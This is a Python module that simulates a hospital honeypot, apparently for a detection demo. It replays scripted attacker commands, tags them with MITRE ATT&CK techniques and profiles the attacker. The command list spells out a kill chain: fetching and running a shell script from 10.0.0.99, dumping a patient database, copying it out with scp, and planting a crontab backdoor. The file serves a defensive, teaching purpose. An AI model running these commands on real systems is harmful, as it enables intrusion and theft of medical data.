import time
import random
import threading

# Simulated fake files the attacker "finds" in the honeypot
FAKE_FILES = [
    "/var/db/patients/records_2024.sql",
    "/home/admin/.ssh/id_rsa",
    "/etc/passwd",
    "/opt/hospital/config/db_credentials.json",
    "/backup/imagerie/full_backup_jan.tar.gz",
]

# Simulated attacker commands in the honeypot
ATTACKER_COMMANDS = [
    ("ls -la /var/db/", "Exploration du système de fichiers"),
    ("cat /etc/passwd", "Lecture des utilisateurs système"),
    ("find / -name '*.sql' 2>/dev/null", "Recherche de bases de données"),
    ("wget http://10.0.0.99/malware.sh -O /tmp/m.sh", "Téléchargement d'un outil malveillant"),
    ("chmod +x /tmp/m.sh && /tmp/m.sh", "Exécution de malware"),
    ("mysqldump -u root -p hospital_db > /tmp/dump.sql", "Dump base de données patients"),
    ("scp /tmp/dump.sql attacker@10.0.0.99:/exfil/", "Exfiltration des données"),
    ("crontab -e # persistence backdoor", "Installation d'une backdoor"),
]

# MITRE ATT&CK technique mapping
MITRE_TECHNIQUES = {
    "ls -la": {"id": "T1083", "name": "File and Directory Discovery"},
    "cat /etc/passwd": {"id": "T1003", "name": "OS Credential Dumping"},
    "find /": {"id": "T1083", "name": "File and Directory Discovery"},
    "wget": {"id": "T1105", "name": "Ingress Tool Transfer"},
    "chmod": {"id": "T1222", "name": "File and Directory Permissions Modification"},
    "mysqldump": {"id": "T1005", "name": "Data from Local System"},
    "scp": {"id": "T1048", "name": "Exfiltration Over Alternative Protocol"},
    "crontab": {"id": "T1053", "name": "Scheduled Task/Job"},
}


class Honeypot:
    def __init__(self, on_event_callback):
        self.on_event = on_event_callback
        self.active = False
        self.logs = []
        self.techniques_seen = []
        self._thread = None

    def activate(self):
        if self.active:
            return
        self.active = True

        self.on_event({
            "type": "honeypot_activated",
            "message": "Honeypot instancié — Infrastructure fictive déployée",
            "fake_ip": "192.168.99.1",
            "fake_services": ["HTTP:443", "SSH:22", "MySQL:3306", "FTP:21"],
        })

        self._thread = threading.Thread(target=self._simulate_attacker, daemon=True)
        self._thread.start()

    def _simulate_attacker(self):
        """Simulate the attacker exploring the honeypot."""
        time.sleep(2)  # attacker takes a moment to orient himself

        for cmd, description in ATTACKER_COMMANDS:
            if not self.active:
                break

            # Identify MITRE technique
            technique = None
            for keyword, t in MITRE_TECHNIQUES.items():
                if keyword in cmd:
                    technique = t
                    break

            # Fake output for some commands
            output = self._fake_output(cmd)

            log_entry = {
                "type": "honeypot_log",
                "timestamp": time.strftime("%H:%M:%S"),
                "command": cmd,
                "description": description,
                "output": output,
                "mitre": technique,
            }

            self.logs.append(log_entry)
            if technique and technique not in self.techniques_seen:
                self.techniques_seen.append(technique)

            self.on_event(log_entry)
            time.sleep(random.uniform(1.5, 3.5))

        # Final attacker profile
        if self.active:
            self.on_event({
                "type": "attacker_profile",
                "techniques_count": len(self.techniques_seen),
                "techniques": self.techniques_seen,
                "commands_count": len(self.logs),
                "profile": self._build_profile(),
            })

    def _fake_output(self, cmd):
        outputs = {
            "ls -la /var/db/": "total 4821\ndrwxr-x--- 3 mysql mysql 4096 jan 12\n-rw-r----- 1 mysql mysql 2459821 jan 12 records_2024.sql",
            "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nmysql:x:27:27:MySQL:/var/lib/mysql:/bin/false\nhospital_admin:x:1001:1001::/home/hospital_admin:/bin/bash",
            "find / -name '*.sql' 2>/dev/null": "/var/db/patients/records_2024.sql\n/backup/dump_2024_01.sql\n/tmp/test.sql",
            "mysqldump -u root -p hospital_db > /tmp/dump.sql": "[Honeypot] Dump simulé — 12 428 enregistrements patients fictifs capturés",
        }
        return outputs.get(cmd, "[commande exécutée]")

    def _build_profile(self):
        technique_ids = [t["id"] for t in self.techniques_seen]
        if "T1048" in technique_ids or "T1005" in technique_ids:
            motivation = "Exfiltration de données médicales (revente probable)"
        elif "T1105" in technique_ids:
            motivation = "Déploiement de ransomware"
        else:
            motivation = "Espionnage industriel"

        return {
            "motivation": motivation,
            "sophistication": "Intermédiaire" if len(self.techniques_seen) < 4 else "Avancée",
            "risk_level": "CRITIQUE",
        }

    def deactivate(self):
        self.active = False